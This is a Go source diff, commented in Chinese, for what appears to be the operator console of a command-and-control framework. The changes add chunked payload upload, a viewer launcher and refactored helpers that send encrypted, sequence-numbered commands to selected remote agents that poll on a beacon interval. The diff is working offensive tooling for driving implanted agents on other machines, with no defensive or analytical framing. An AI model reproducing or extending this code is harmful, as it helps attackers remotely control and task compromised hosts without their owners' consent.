@@ -36,6 +36,8 @@ const (
 	helloVersion = uint32(1<<16 | 1)
 	// 结果等待超时：beacon 轮询下要等 sleeptime(60s) + 执行(120s) + 余量
 	waitTimeout = 240 * time.Second
+	// payload 分块大小（协议 §10）
+	payloadChunkSize = 256 * 1024
 )
 
 // SessionInfo 会话表条目（协议 §5.3）。
@@ -53,6 +55,7 @@ type SessionInfo struct {
 type shellState struct {
 	conn net.Conn
 	key  []byte
+	addr string // C2 地址（拉起 viewer 时透传）
 
 	seq  atomic.Uint32 // 指令序号（严格递增，满足服务器防重放）
 	cur  string        // 当前 Agent ID（hex，空 = 未选择）
@@ -75,7 +78,9 @@ type result struct {
 
 func main() {
 	addr := flag.String("s", defaultAddr, "C2 server address host:port")
+	viewerPath := flag.String("viewer", "", "viewer.exe 路径（默认自动查找）")
 	flag.Parse()
+	viewerOverride = *viewerPath
 
 	psk, err := hex.DecodeString(pskHex)
 	if err != nil {
@@ -93,7 +98,7 @@ func main() {
 	}
 	fmt.Fprintf(os.Stderr, "connected to %s (session key derived)\n", *addr)
 
-	st := &shellState{conn: conn, key: key}
+	st := &shellState{conn: conn, key: key, addr: *addr}
 	go st.readLoop() // 后台读线程：收 CMD_RESULT / 管理响应
 	st.repl()
 }
@@ -160,31 +165,88 @@ func (st *shellState) sendAndWait(cmd uint16, plugin uint8, payload []byte,
 	}
 }
 
-// execBusiness 对当前 Agent 发送业务指令（payload = agent_id + args），返回 status 与结果文本。
-func (st *shellState) execBusiness(cmd uint16, args []byte) (uint8, string, error) {
+// currentAgentIDHex 返回当前选中的 Agent ID（hex）。
+func (st *shellState) currentAgentIDHex() (string, error) {
 	st.curMu.Lock()
 	cur := st.cur
 	st.curMu.Unlock()
 	if cur == "" {
-		return 0, "", errors.New("no agent selected (use 'sessions' then 'use <id>')")
+		return "", errors.New("no agent selected (use 'sessions' then 'use <id>')")
 	}
-	agentID, err := hex.DecodeString(cur)
+	return cur, nil
+}
+
+// buildBusinessTo 构造业务指令 payload：agent_id(16B) + args（C2 据此路由，转发时剥离前缀）。
+func (st *shellState) buildBusinessTo(agentHex string, args []byte) ([]byte, error) {
+	agentID, err := hex.DecodeString(agentHex)
 	if err != nil || len(agentID) != 16 {
-		return 0, "", fmt.Errorf("bad current agent id %q", cur)
+		return nil, fmt.Errorf("bad agent id %q", agentHex)
 	}
 	payload := make([]byte, 0, 16+len(args))
 	payload = append(payload, agentID...)
 	payload = append(payload, args...)
+	return payload, nil
+}
 
-	_, body, err := st.sendAndWait(cmd, protocol.PluginSys, payload,
-		protocol.CmdResult, waitTimeout)
+// buildBusiness 使用当前选中的 Agent 构造业务 payload。
+func (st *shellState) buildBusiness(args []byte) ([]byte, error) {
+	cur, err := st.currentAgentIDHex()
+	if err != nil {
+		return nil, err
+	}
+	return st.buildBusinessTo(cur, args)
+}
+
+// businessRawTo 向指定 Agent 发送业务指令，返回 status 与结果原始字节（二进制安全）。
+func (st *shellState) businessRawTo(agentHex string, cmd uint16, plugin uint8, args []byte,
+	timeout time.Duration) (uint8, []byte, error) {
+	payload, err := st.buildBusinessTo(agentHex, args)
+	if err != nil {
+		return 0, nil, err
+	}
+	_, body, err := st.sendAndWait(cmd, plugin, payload, protocol.CmdResult, timeout)
+	if err != nil {
+		return 0, nil, err
+	}
+	if len(body) < 5 {
+		return 0, nil, errors.New("short result payload")
+	}
+	return body[4], body[5:], nil
+}
+
+// businessRaw 对当前选中的 Agent 发送业务指令。
+func (st *shellState) businessRaw(cmd uint16, plugin uint8, args []byte,
+	timeout time.Duration) (uint8, []byte, error) {
+	cur, err := st.currentAgentIDHex()
+	if err != nil {
+		return 0, nil, err
+	}
+	return st.businessRawTo(cur, cmd, plugin, args, timeout)
+}
+
+// execBusiness 业务指令的文本封装（payload = agent_id + args），返回 status 与结果文本。
+func (st *shellState) execBusiness(cmd uint16, plugin uint8, args []byte) (uint8, string, error) {
+	status, body, err := st.businessRaw(cmd, plugin, args, waitTimeout)
 	if err != nil {
 		return 0, "", err
 	}
-	if len(body) < 5 {
-		return 0, "", errors.New("short result payload")
+	return status, string(body), nil
+}
+
+// businessNoWait 只发送不等结果（payload 分块流水线：末块才等待）。
+func (st *shellState) businessNoWait(cmd uint16, plugin uint8, args []byte) error {
+	payload, err := st.buildBusiness(args)
+	if err != nil {
+		return err
 	}
-	return body[4], string(body[5:]), nil
+	enc, err := protocol.EncryptPayload(st.key, payload)
+	if err != nil {
+		return err
+	}
+	seq := st.seq.Add(1)
+	return protocol.WritePacket(st.conn, &protocol.Header{
+		Flags: protocol.FlagEncrypted, Seq: seq, Cmd: cmd, Plugin: plugin,
+	}, enc)
 }
 
 // handshake 完成 HELLO/HELLO_ACK，返回派生会话密钥。
